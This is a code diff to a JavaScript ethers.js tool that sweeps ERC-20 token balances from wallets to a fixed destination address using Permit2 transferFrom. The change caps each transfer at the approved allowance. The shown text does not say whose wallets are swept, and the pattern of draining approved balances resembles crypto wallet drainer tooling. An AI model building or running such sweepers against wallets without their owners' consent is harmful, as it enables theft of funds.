@@ -816,9 +816,13 @@ async function sweepGaslessWallet(walletAddress) {
         const token   = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
         const balance = await token.balanceOf(checksum);
         if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
-        log(`[gasless/allowance] ${checksum} balance=${balance} -- transferFrom ${tokenAddr.slice(0, 10)}`);
+        const erc20Allowance = await token.allowance(checksum, PERMIT2_ADDRESS).catch(() => balance);
+        const sweepAmount = erc20Allowance < balance ? erc20Allowance : balance;
+        if (sweepAmount === 0n) { log(`[gasless/allowance] ${tokenAddr.slice(0,10)} ERC-20 allowance to Permit2 is 0 — skipping`); continue; }
+        if (sweepAmount < balance) log(`[gasless/allowance] ⚠️  capping ${tokenAddr.slice(0,10)} to allowance ${sweepAmount} (< balance ${balance})`);
+        log(`[gasless/allowance] ${checksum} balance=${balance} sweepAmount=${sweepAmount} -- transferFrom ${tokenAddr.slice(0, 10)}`);
         const fee = await getFeeData();
-        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr,
+        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmount, tokenAddr,
           { gasLimit: 150_000n, ...fee });
         log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
         await tx.wait();
@@ -1618,7 +1622,15 @@ async function sweep(wallet) {
           const { success, returnData: data } = allowChecks[i];
           let allow = 0n;
           if (success && data && data !== "0x") { try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch {} }
-          allow > 0n ? approved.push(withBalance[i]) : skipped.push(withBalance[i].token.slice(0, 10));
+          if (allow > 0n) {
+            const cappedBalance = allow < withBalance[i].balance ? allow : withBalance[i].balance;
+            if (cappedBalance < withBalance[i].balance) {
+              log(`[gasless] ⚠️  ${withBalance[i].token.slice(0, 10)} ERC-20→Permit2 allowance ${allow} < balance ${withBalance[i].balance} — sweeping capped amount`);
+            }
+            approved.push({ ...withBalance[i], balance: cappedBalance });
+          } else {
+            skipped.push(withBalance[i].token.slice(0, 10));
+          }
         }
         if (skipped.length) log(`[gasless] ⚠️  ${skipped.length} token(s) need on-chain Permit2 approval: ${skipped.join(", ")}`);
         withBalance.splice(0, withBalance.length, ...approved);
